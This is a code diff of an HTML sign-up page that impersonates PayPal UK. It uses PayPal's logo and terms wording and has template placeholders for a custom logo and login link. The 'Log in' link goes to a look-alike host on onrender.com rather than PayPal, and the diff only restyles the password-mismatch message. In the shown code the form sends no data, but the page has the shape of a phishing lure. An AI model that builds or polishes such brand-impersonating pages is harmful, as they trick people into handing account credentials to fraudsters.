@@ -1,23 +1,37 @@
-<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>PayPal UK🇬🇧 SignUp</title> <style> *{ box-sizing:border-box; } body{ margin:0; font-family:Arial,Helvetica,sans-serif; background:#f5f7fa; color:#172b4d; } .demo{ text-align:center; font-size:12px; color:#777; margin-top:18px; } .card{ width:100%; max-width:460px; margin:18px auto 50px; background:#fff; padding:35px 35px 40px; border-radius:10px; box-shadow:0 2px 12px rgba(0,0,0,.08); } /* CUSTOM LOGO */ .logo{ width:130px; height:42px; object-fit:contain; display:block; margin:0 auto 28px; } h1{ text-align:center; font-size:27px; margin:0 0 28px; color:#172b4d; } label{ display:block; font-size:14px; font-weight:600; margin:18px 0 7px; } input{ width:100%; height:48px; border:1px solid #9ca3af; border-radius:6px; padding:0 13px; font-size:16px; outline:none; } input:focus{ border-color:#0876d1; box-shadow:0 0 0 2px rgba(8,118,209,.12); } button{ width:100%; height:50px; margin-top:25px; border:0; border-radius:25px; background:#0876d1; color:#fff; font-size:16px; font-weight:700; cursor:pointer; } button:hover{ background:#0668b9; } .terms{ margin-top:20px; font-size:12px; line-height:1.6; color:#5f6b7a; text-align:center; } .login{ text-align:center; margin-top:25px; font-size:14px; } .login a{ color:#0876d1; font-weight:600; text-decoration:none; } .login a:hover{ text-decoration:underline; } .footer{ text-align:center; color:#667085; font-size:12px; padding:20px; } </style> </head> <body> <div class="demo"></div> <main class="card"> <!-- ========================================== CUSTOM LOGO Replace YOUR_LOGO_URL_HERE with your logo URL ========================================== --> <img class="logo" src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg?utm_source=chatgpt.com" alt="BluePay" > <h1>Create your account</h1> <form id="signupForm"> <label for="name">Full name</label> <input id="name" type="text" placeholder="Enter your full name" autocomplete="name" required > <label for="email">Email address</label> <input id="email" type="email" placeholder="you@example.com" autocomplete="email" required > <label for="password">Create password</label>
+<!doctype html> <html lang="en"> <head> <meta charset="utf-8"> <meta name="viewport" content="width=device-width,initial-scale=1"> <title>PayPal UK🇬🇧 SignUp</title> <style> *{ box-sizing:border-box; } body{ margin:0; font-family:Arial,Helvetica,sans-serif; background:#f5f7fa; color:#172b4d; } .demo{ text-align:center; font-size:12px; color:#777; margin-top:18px; } .card{ width:100%; max-width:460px; margin:18px auto 50px; background:#fff; padding:35px 35px 40px; border-radius:10px; box-shadow:0 2px 12px rgba(0,0,0,.08); } /* CUSTOM LOGO */ .logo{ width:130px; height:42px; object-fit:contain; display:block; margin:0 auto 28px; } h1{ text-align:center; font-size:27px; margin:0 0 28px; color:#172b4d; } label{ display:block; font-size:14px; font-weight:600; margin:18px 0 7px; } input{ width:100%; height:48px; border:1px solid #9ca3af; border-radius:6px; padding:0 13px; font-size:16px; outline:none; } input:focus{ border-color:#0876d1; box-shadow:0 0 0 2px rgba(8,118,209,.12); } button{ width:100%; height:50px; margin-top:25px; border:0; border-radius:25px; background:#0876d1; color:#fff; font-size:16px; font-weight:700; cursor:pointer; } button:hover{ background:#0668b9; } .terms{ margin-top:20px; font-size:12px; line-height:1.6; color:#5f6b7a; text-align:center; } .login{ text-align:center; margin-top:25px; font-size:14px; } .login a{ color:#0876d1; font-weight:600; text-decoration:none; } .login a:hover{ text-decoration:underline; } .footer{
+  text-align:center;
+  color:#667085;
+  font-size:12px;
+  padding:20px;
+}
+
+#signupMessage{
+  display:block;
+  margin-top:12px;
+  text-align:center;
+  color:red !important;
+  font-size:14px;
+  font-weight:700;
+} </style> </head> <body> <div class="demo"></div> <main class="card"> <!-- ========================================== CUSTOM LOGO Replace YOUR_LOGO_URL_HERE with your logo URL ========================================== --> <img class="logo" src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg?utm_source=chatgpt.com" alt="BluePay" > <h1>Create your account</h1> <form id="signupForm"> <label for="name">Full name</label> <input id="name" type="text" placeholder="Enter your full name" autocomplete="name" required > <label for="email">Email address</label> <input id="email" type="email" placeholder="you@example.com" autocomplete="email" required > <label for="password">Create password</label>
 <input id="password" type="password" placeholder="Create a password" autocomplete="new-password" minlength="8" required>
 
 <label for="confirmPassword">Confirm password</label>
-<input id="confirmPassword" type="password" placeholder="Confirm your password" autocomplete="new-password" required> <button type="submit"> Create account </button> </form> <div class="terms"> By creating an account, you agree to PayPal terms and privacy notice. </div> <!-- ========================================== CUSTOM LOGIN LINK Replace YOUR_LOGIN_URL_HERE with your link ========================================== --> <div class="login"> Already have an account? <a href="https://paypal-n22w.onrender.com"> Log in </a> </div> </main> <footer class="footer"> © 1999–2026 All Rights Reserved. </footer> <script>
+<input id="confirmPassword" type="password" placeholder="Confirm your password" autocomplete="new-password" required> <button type="submit">Create account</button>
+
+<div id="signupMessage"></div> </form> <div class="terms"> By creating an account, you agree to PayPal terms and privacy notice. </div> <!-- ========================================== CUSTOM LOGIN LINK Replace YOUR_LOGIN_URL_HERE with your link ========================================== --> <div class="login"> Already have an account? <a href="https://paypal-n22w.onrender.com"> Log in </a> </div> </main> <footer class="footer"> © 1999–2026 All Rights Reserved. </footer> <script>
 document.getElementById("signupForm").addEventListener("submit", function(e){
 
   e.preventDefault();
 
   const password = document.getElementById("password").value;
   const confirmPassword = document.getElementById("confirmPassword").value;
+  const message = document.getElementById("signupMessage");
 
   if (password !== confirmPassword) {
-
-    alert("Wrong password. Passwords do not match.");
-
+    message.textContent = "Wrong password. Passwords do not match.";
     return;
   }
 
-  alert("Sign Up with PayPal from Precise Location");
-
+  message.textContent = "Sign up from your precise location.";
 });
 </script> </body> </html> 
